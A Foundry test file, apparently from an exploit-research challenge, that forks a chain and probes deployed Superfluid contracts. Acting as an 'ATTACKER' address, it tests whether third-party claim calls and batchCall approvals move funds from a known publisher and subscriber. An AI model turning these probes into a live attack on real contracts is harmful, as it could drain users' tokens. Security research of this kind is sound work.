// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

// Minimal interfaces
interface ISuperfluid {
    struct Operation { uint32 operationType; address target; bytes data; }
    function callAgreement(address agreementClass, bytes calldata callData, bytes calldata userData) external returns (bytes memory returnedData);
    function batchCall(Operation[] memory operations) external;
    function isApp(address app) external view returns (bool);
    function getAgreementClass(bytes32 id) external view returns (address);
    function decodeCtx(bytes memory ctx) external pure returns (
        uint8 appCallbackLevel, uint8 callType, uint256 timestamp,
        address msgSender, bytes4 agreementSelector, bytes memory userData,
        uint256 appCreditGranted, uint256 appCreditWanted,
        int256 appCreditUsed, address appAddress, address appCreditToken
    );
}

interface IIDA {
    function claim(address token, address publisher, uint32 indexId, address subscriber, bytes calldata ctx) external returns (bytes memory newCtx);
    function getIndex(address token, address publisher, uint32 indexId) external view returns (bool exist, uint128 indexValue, uint128 totalUnitsApproved, uint128 totalUnitsPending);
    function getSubscription(address token, address publisher, uint32 indexId, address subscriber) external view returns (bool exist, bool approved, uint128 units, uint256 pendingDistribution);
}

interface ISuperToken {
    function balanceOf(address account) external view returns (uint256);
    function realtimeBalanceOfNow(address account) external view returns (int256 availableBalance, uint256 deposit, uint256 owedDeposit);
    function downgradeToETH(uint256 amount) external;
    function operationApprove(address account, address spender, uint256 amount) external;
}

contract Ch5BrainDirect is Test {
    ISuperfluid constant HOST = ISuperfluid(0x3E14dC1b13c488a8d5D310918780c983bD5982E7);
    address constant IDA = 0xB0aABBA4B2783A72C52956CDEF62d438ecA2d7a1;
    ISuperToken constant MATICx = ISuperToken(0x3aD736904E9e65189c3000c7DD2c8AC8bB7cD4e3);

    // Known tuple with pending distribution
    address constant PUBLISHER = 0xcaB28480ab5c1E133e9B7FC67E030B8DCC2A1d24;
    address constant SUBSCRIBER = 0x9C6B5FdC145912dfe6eE13A667aF3C5Eb07CbB89;
    uint32 constant INDEX_ID = 1;

    address constant ATTACKER = 0xc943eDB4Bb4439d65B81f2f60Bc698411e910B14;

    function setUp() public {
        vm.createSelectFork(vm.envString("RPC_CH5_SUPERFLUID_V2"));
    }

    /// @notice Test 1: Normal claim (no forgery) - observe what happens
    function test_normalClaim() public {
        // Check initial state
        (bool exist, bool approved, uint128 units, uint256 pending) =
            IIDA(IDA).getSubscription(address(MATICx), PUBLISHER, INDEX_ID, SUBSCRIBER);
        console.log("Subscription exists:", exist);
        console.log("Approved:", approved);
        console.log("Units:", units);
        console.log("Pending:", pending);

        uint256 publisherBefore = MATICx.balanceOf(PUBLISHER);
        uint256 subscriberBefore = MATICx.balanceOf(SUBSCRIBER);
        uint256 attackerBefore = MATICx.balanceOf(ATTACKER);
        console.log("Publisher MATICx before:", publisherBefore);
        console.log("Subscriber MATICx before:", subscriberBefore);
        console.log("Attacker MATICx before:", attackerBefore);

        // Call claim through Host (normal, no forgery)
        bytes memory claimData = abi.encodeCall(
            IIDA.claim,
            (address(MATICx), PUBLISHER, INDEX_ID, SUBSCRIBER, new bytes(0))
        );

        vm.prank(ATTACKER);
        HOST.callAgreement(IDA, claimData, "");

        uint256 publisherAfter = MATICx.balanceOf(PUBLISHER);
        uint256 subscriberAfter = MATICx.balanceOf(SUBSCRIBER);
        uint256 attackerAfter = MATICx.balanceOf(ATTACKER);
        console.log("Publisher MATICx after:", publisherAfter);
        console.log("Subscriber MATICx after:", subscriberAfter);
        console.log("Attacker MATICx after:", attackerAfter);
        console.log("Publisher delta:", int256(publisherAfter) - int256(publisherBefore));
        console.log("Subscriber delta:", int256(subscriberAfter) - int256(subscriberBefore));
        console.log("Attacker delta:", int256(attackerAfter) - int256(attackerBefore));
    }

    /// @notice Test 3: What if we use batchCall with approve + transferFrom?
    /// Even though operationApprove uses msg.sender, check ALL batch ops
    function test_batchCallOps() public {
        // Check: does the fork SuperToken have operationTransferFrom?
        // If not, what operations ARE available through batchCall?

        // Try operationApprove (op type 1)
        ISuperfluid.Operation[] memory ops = new ISuperfluid.Operation[](1);
        ops[0] = ISuperfluid.Operation({
            operationType: 1, // ERC20_APPROVE
            target: address(MATICx),
            data: abi.encode(address(this), type(uint256).max)
        });

        vm.prank(ATTACKER);
        try HOST.batchCall(ops) {
            console.log("batchCall approve succeeded");
            uint256 allowance = MATICx.balanceOf(ATTACKER); // check if anything changed
            console.log("Attacker balance:", allowance);
        } catch (bytes memory err) {
            console.log("batchCall approve failed");
            console.logBytes(err);
        }
    }
}
